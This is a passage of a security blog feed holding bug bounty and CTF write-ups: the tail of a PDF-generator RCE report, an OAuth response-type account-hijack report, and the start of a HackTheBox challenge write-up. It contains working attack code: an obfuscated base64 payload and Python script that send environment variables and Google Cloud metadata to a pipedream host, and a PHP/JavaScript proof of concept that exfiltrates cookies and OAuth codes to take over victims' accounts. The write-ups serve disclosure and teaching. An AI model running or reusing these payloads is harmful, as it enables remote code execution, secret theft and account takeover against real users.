<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b't\\x00d\\x01\\x83\\x01\\xa0\\x01d\\x02\\xa1\\x01\\x01\\x00d\\x00S\\x00', (None, 'os', 'echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash'), ('__import__', 'system'), (), '&lt;stdin&gt;', '', 1, b'\\x12\\x01'), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word('__code__')))] ] for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'"</span><span class="nt">&gt;</span>exploit<span class="nt">&lt;/font&gt;</span>
</code></pre></div></div>

<p>The content of /proc/self/environ were really really sensitive , I submitted the report at this moment. As this server responsible for generating pdfs was hosted on Google Cloud , I could even fetch Metadata response also.</p>

<p>To confirm this I used the below payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;import base64;metadata_url = 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true';metadata_headers = {'Metadata-Flavor': 'Google'};response = requests.get(metadata_url, headers=metadata_headers);encoded_metadata = base64.b64encode(response.text.encode()).decode();target_server_url = 'https://en2celq7rewbul.m.pipedream.net/';data_payload = {'metadata': encoded_metadata};requests.post(target_server_url, json=data_payload)"</span>
</code></pre></div></div>

<p>Beautified one line code for you :)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="n">metadata_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://169.254.169.254/computeMetadata/v1/instance/?recursive=true</span><span class="sh">'</span>

<span class="n">metadata_headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">Metadata-Flavor</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Google</span><span class="sh">'</span><span class="p">}</span> <span class="c1"># custom metadata header requirement we have RCE so we could add it easily ;)
</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">metadata_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">metadata_headers</span><span class="p">)</span>

<span class="n">encoded_metadata</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>

<span class="n">target_server_url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://en2celq7rewbul.m.pipedream.net/</span><span class="sh">'</span>

<span class="n">data_payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">metadata</span><span class="sh">'</span><span class="p">:</span> <span class="n">encoded_metadata</span><span class="p">}</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">target_server_url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data_payload</span><span class="p">)</span>
</code></pre></div></div>

<p>The above code basically makes a request to the Google cloud Metadata Endpoint then sends the json response to my server (which is base64 encoded), at last I also confirmed if I could fetch access_token for the used serviceAccount.</p>

<p>After confirming all this I ceased my testing and reported everything to the program.</p>

<p>The program was really happy with the report, although their maximum payout was 3k they still paid this 4.5k for this bug</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/b501f9f9-57f4-4138-8984-23ea6e981ec9" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.]]></summary></entry><entry><title type="html">Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com</title><link href="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" rel="alternate" type="text/html" title="Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com" /><published>2023-09-10T00:00:00+00:00</published><updated>2023-09-10T00:00:00+00:00</updated><id>http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance</id><content type="html" xml:base="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html"><![CDATA[<p>My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.</p>

<p>Although https://login.redacted.com is really a special domain as it’s used for signup/login , oauth ,etc so there must be a way to do something impactful.</p>

<p>During that time, I remembered about Frans Rosen’s research on Oauth https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ eg: where by changing the response_type from code to code,id_token made the OAuth provider return the oauth token,etc in the hash fragment of the url. If the web server isn’t configured to handle /  expects the oauth token in a query param  it might return an error page and the oauth token may be remain as it is in the hash fragment. (Checkout for more ways to fail the oauth flow)</p>

<p>Now all the attacker needs is a way to steal that oauth token , Frans talked in detail about various ways which could be used for this, even disclosed some of his findings publically.</p>

<p>https://hackerone.com/reports/1567186
https://gitlab.com/gitlab-org/gitlab/-/issues/362394</p>

<p>Please read the blogpost by Frans Rosen before moving on as everything is explained there in very detail.</p>

<hr />

<p>I clicked on the <code class="language-plaintext highlighter-rouge">Sign in With Google</code> button and it redirect me to this url:</p>

<p>https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=code&amp;client_id=redacted.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Flogin.redacted.com%2Fservices%2Fauthcallback%2Fgoogle&amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&amp;state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;service=lso&amp;o2v=1&amp;flowName=GeneralOAuthFlow</p>

<p>I changed the <code class="language-plaintext highlighter-rouge">response_type</code> to <code class="language-plaintext highlighter-rouge">response_type=code,id_token</code> and now just went with the oauth flow , I was redirected to this page.</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;code=4/0Adeu5BUex4YzCBcszdOirTLW_UO0o7O5QXEynHjerek2dUDBLaV2QjPMdkK051x7MOBdzA&amp;scope=email%20profile%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&amp;id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjgzOGMwNmM2MjA0NmMyZDk000GFmZmUxMzdkZDUzMTAxMjlmNGQ1ZDEiLCJ0eXAiOiJKV1QifQ.xxxxxx.O2OPIsMtZZzUc4v3zHXPBCL5rfjciDfPqQScixbpsSXdEbgsxpxMhcz5M3P01yFaVsAzxyXY2iK9kT6gaul99FmizlBk9tpTfcmHCTSlYKiVz-JTn0LevJHoaRSy8hrH5u5TTLpes3yC2U6pZrdPPQgFZsHFKa8gE2N9-XKK80IKwyftukCjNSNFLhGnJy92h7P4xADUS353R0v8C1WnL8J7Ha7Ic-2lr9xg0AKDoYdTiKqAL7FfSq6rUCDR9pPzmXkud0GA_Ff0h_CuOhD_loXRP8t0F8rsjNdQEHR2RLllmSfZtFS2jjUFr7AAgyZav6fF7Xga_jzNnDyWzriAo4A&amp;authuser=0&amp;prompt=consent&amp;version_info=CmxfU1ZJX0VLU0Vzc2pBbjRFREdCQWlQMDFCUlVSSVpsOXhSRFk0WjJwYWFFUmplamxqUmxOTWVIVjZYeTFtZUZwV2EzQkJhWFZrY0dKd1pIWmFOV2x6WVRocU4yNHlkVGhRYnpGeVZsTkNWUV8</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/identity/sso/ui/AuthorizationError?
ErrorCode=No_Oauth_State
&amp;ErrorDescription=State+was+not+sent+back
&amp;ProviderId=redacted
#state=CAAAAY&amp;code=4/0Ad...&amp;id_token=eyJh..................
</code></pre></div></div>

<p>From the <code class="language-plaintext highlighter-rouge">ErrorDescription</code> you can see the server was expecting a state parameter to be there in the query param but as the hash fragment is there and is only accessible via client side js , as they are in the hash fragment the error is shown.</p>

<p>Now all we need is a way to steal the hash fragment.
As our xss is in the same domain, I can easily read it. All I need is to make some relation between the error page containing code in hash and the xss page.</p>

<hr />

<p>I went ahead and created a poc, which first setups the oauth url with the modified response_type , then opens the xss endpoint in a new tab using javascript’s window.open (we will refer to this tab as winB), then using window.location I redirected the current page to the oauth url (we will refer this as winA).</p>

<p>The oauth flow takes place and the user is redirected to this url (in winA tab)</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>

<p>See the origin of winA it’s login.redacted.com and the origin of winB is also login.redacted.com. As both winA and winB are of same origin, we can read the full url of winA tab. Using window.opener.document.location.hash property from the winB tab where we have xss, I can easily get the necessary paramater values eg: code . An attacker can send this to his server and then login into victim’s account by just placing the retrieved state and code parameter value in this callback url:</p>

<p>${state} and ${code} are the place holders.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/services/authcallback/google?state=${state}&amp;code=${code}&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none
</code></pre></div></div>

<p>Now the attacker just needs to make a request to this url and he will be able to login to victim’s account after following the below steps.</p>

<hr />

<p>I wrote the following php script to do the above steps:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://login.redacted.com/services/auth/sso/google/"</span><span class="p">;</span>

<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// The response of this url contains the oauth url in the Location header and the idccsrf cookie from the Set-Cookie header</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> <span class="c1">//[1]</span>

<span class="nv">$header_size</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLINFO_HEADER_SIZE</span><span class="p">);</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
<span class="nv">$body</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>

<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>

<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$headers</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Location: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$location</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1">//oauth url is stored here</span>
    <span class="p">}</span>

    <span class="c1"># get set-cookie</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Set-Cookie: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>  <span class="c1">// idccsrf cookie is stored here</span>
    <span class="p">}</span>
<span class="p">}</span>



<span class="c1">#send this cookie to attacker controlled server https://en2celr7rewbul.m.pipedream.net/steal?q=</span>

<span class="nv">$attackerDomain</span> <span class="o">=</span> <span class="s2">"https://en2celr7oewbxl.m.pipedream.net/steal?q="</span><span class="p">;</span>

<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$attackerDomain</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> 



<span class="c1">#replace the response_type parameter value with code,id_token oauthUrl</span>

<span class="nv">$location</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'response_type=code'</span><span class="p">,</span> <span class="s1">'response_type=code,id_token'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">);</span> <span class="c1">// [2]</span>


<span class="cp">?&gt;</span>


<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Oauth url: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
        
        <span class="c1">// this is the xss payload which we used to steal the authorization code  </span>

        <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$attackerDomain</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>

        <span class="kd">function</span> <span class="nf">startExploit</span><span class="p">(){</span>
            <span class="c1">// window.open location value, it opens the vulnerable xss endpoint a new window</span>


            <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
            <span class="c1">// wait 5 seconds</span>

            <span class="c1">// This opens the oauth url in the current tab</span>

            <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">;`</span>
                
            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>

            <span class="c1">//great now if I run `window.opener` from the xss page I get the whole token and everything</span>

        <span class="p">}</span>

    <span class="nt">&lt;/script&gt;</span>

    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"startExploit()"</span><span class="nt">&gt;</span>Start Exploit<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>

<p>This endpoint was responsible for generating the oauth url:</p>

<p><img src="https://github.com/Sudistark/xss-writeups/assets/31372554/c80c6611-6339-478a-8a2f-8bb2cb4d7d0f" alt="BurpSuiteCommunity_xLyg501nml" /></p>

<p>In the response headers you can see this cookie:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: idccsrf=-898201194036363428516943317029004569446202656766185;
</code></pre></div></div>

<p>This cookie is really important , while using the the authorization code the server validates if the user’s cookie <code class="language-plaintext highlighter-rouge">idccsrf</code> matches with the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie assigned at the time of generating the ouath url.</p>

<p>The above php code does the following thing,makes a request to https://login.redacted.com/services/auth/sso/google/ on line [1], from the header response get the <code class="language-plaintext highlighter-rouge">Location</code> header value and from the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header get the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie value.</p>

<p>Then we send the cookie to our logging server so that we can use it later.
On line [2] we modify the <code class="language-plaintext highlighter-rouge">response_type</code> parameter value to <code class="language-plaintext highlighter-rouge">code,id_token</code>.</p>

<p>After that starts javascript code</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("&lt;?php echo $attackerDomain; ?&gt;"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
</code></pre></div></div>

<p>This is the xss payload which we will be using , basically it alerts the 
<code class="language-plaintext highlighter-rouge">window.opener.document.location.hash</code> value after 9sec.</p>

<p>The <code class="language-plaintext highlighter-rouge">startExploit</code> method does the following things which are important for this attack,</p>

<p>This opens the xss endpoint via <code class="language-plaintext highlighter-rouge">window.open</code> refers to this window as winB and the current page as winA (which has all the php code,js code,etc)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
</code></pre></div></div>

<p>Then after 5sec , we redirect the winA to the value stored in <code class="language-plaintext highlighter-rouge">$location</code> variable. This variable contains the modified <code class="language-plaintext highlighter-rouge">response_type</code> oauth url.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`&lt;?php echo $location; ?&gt;;`</span>
                
            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
</code></pre></div></div>

<p>Now here’s what will happen, the oauth flow will take place automatically as soon as the url is opened there is no user interaction is involved here where they need to select the google acc, it will automatically sign in the user via their google acc which the victim has previously used.</p>

<p>The winA page url will be like this after the oauth flow is done, a message will be shown on the page that the state param wasn’t provided:</p>

<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>

<p>The code in winB executes after 9sec (this delay is to make sure the oauth flow takes place properly in the winA tab).
As I already explained winA and winB are of same origin login.redacted.com , we can easily accessed any info for winA window from winB.</p>

<p>winA can be accessed by winB via window.opener property, to get the hash value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.opener.document.location.hash
</code></pre></div></div>

<p>Now onto the next part, once we have stealed the victims authorization code. The above exploit also sends the authorization code and idcsrf cookie to attacker controlled server.</p>

<p>Copy the fragment part which is also displayed in the alert popup and paste it in the <code class="language-plaintext highlighter-rouge">getToken</code> method like I have done in this</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// taken one arguement from commandline</span>


<span class="kd">function</span> <span class="nf">getToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">//split the params into array</span>

    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>

    <span class="c1">//get the value for state param and code param</span>

    <span class="kd">var</span> <span class="nx">state</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

    <span class="c1">//console.log(state)</span>
    <span class="c1">//console.log(code)</span>

    <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://login.redacted.com/services/authcallback/google?state=</span><span class="p">${</span><span class="nx">state</span><span class="p">}</span><span class="s2">&amp;code=</span><span class="p">${</span><span class="nx">code</span><span class="p">}</span><span class="s2">&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none`</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">))</span>




<span class="p">}</span>

<span class="c1">//using this we will generate the correct callback url, just paste your input inside it</span>

<span class="nf">getToken</span><span class="p">(</span><span class="dl">"</span><span class="s2">state=CAAAAY&amp;code=4/0AWtgz&amp;scope=email%20profile%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile%20openid&amp;id_token=eyJhb.............&amp;authuser=0&amp;prompt=none</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>The above code will give us the url which can be used now to login into the victim’s account.There is just one important thing to take care of which is the <code class="language-plaintext highlighter-rouge">idccsrf</code> token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn’t able to login to victim’s acc.</p>

<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim’s account.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.]]></summary></entry><entry><title type="html">Hackthebox Business Ctf Writeup</title><link href="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html" rel="alternate" type="text/html" title="Hackthebox Business Ctf Writeup" /><published>2023-07-18T00:00:00+00:00</published><updated>2023-07-18T00:00:00+00:00</updated><id>http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup</id><content type="html" xml:base="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html"><![CDATA[<h1 id="web-desynth-recruit">Web Desynth Recruit</h1>

<p>Me and my friend (@0xbla) spent our weekend solving a very interesting challenge from HTB Business CTF</p>

<p>The challenge was very realistic and it required you to chain a lot of other bugs to solve it, probably the best one we have ever seen.</p>

<p>I will give you a basic idea about the challenge:</p>

<p>The application had basic login/signup flow
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/f0ac9707-b786-423a-8f37-7d04237e3a5f" alt="image" /></p>

<p>Once logged in you were redirect to the <code class="language-plaintext highlighter-rouge">/settings</code> endpoint which allowed you to make changes to your profile: http://localhost:1337/settings</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4746400e-81fa-4eba-af17-2f4ea3c4134b" alt="image" /></p>

<p>The Bio input field says that <em>Bio (limited HTML supported)</em> , so we will put some basic html tags and see if they are rendered or not <code class="language-plaintext highlighter-rouge">&lt;i&gt;shirley&lt;/i&gt;</code> , there is also a file upload which only allows to upload png files.
Once we submit this form , we get this message: <em>Your profile is now public</em></p>

<p>We can now visit our profile via this url : http://localhost:1337/profile/3
(The id 1,2 are reserved for other users probably admin)</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7ae40860-a2f9-42e0-ae2e-a45b98387d36" alt="image" /></p>

<p>From the above screenshot you could see that the <em>Bio</em> field html code didn’t worked although it said that basic html tags were allowed. I also tried some more tags but all of them weren’t rendered.
On the right side you could see we have <em>Report a user</em> functionality where we could report any user profile by just supplying it’s user id.</p>

<p>Going through burp history , I found this endpoint: http://localhost:1337/go?to=/login
It was found to be vulnerable to open redirect, let’s add it to our note and move forward with the source code review part.</p>

<hr />

<h1 id="source-code">Source Code</h1>

<p>The application is in python Flask and it is running in debug mode</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">application.main</span> <span class="kn">import</span> <span class="n">app</span>

<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>The flag is stored on the file system not exposed anywhere else so we might need a rce and also the location is random.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># change flag name</span>
<span class="nb">mv</span> /flag.txt /flag<span class="si">$(</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s1">'a-f0-9'</span> | <span class="nb">head</span> <span class="nt">-c</span> 10<span class="si">)</span>.txt
</code></pre></div></div>

<p>The routes are defined here: /application/blueprints/routes.py</p>

<p>We can confirm the open redirect root cause from here:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/go</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">goto_external_url</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">to</span><span class="sh">'</span><span class="p">))</span>
</code></pre></div></div>

<p>These one routes which isn’t allowed to be access by normal user, looked interesting:</p>

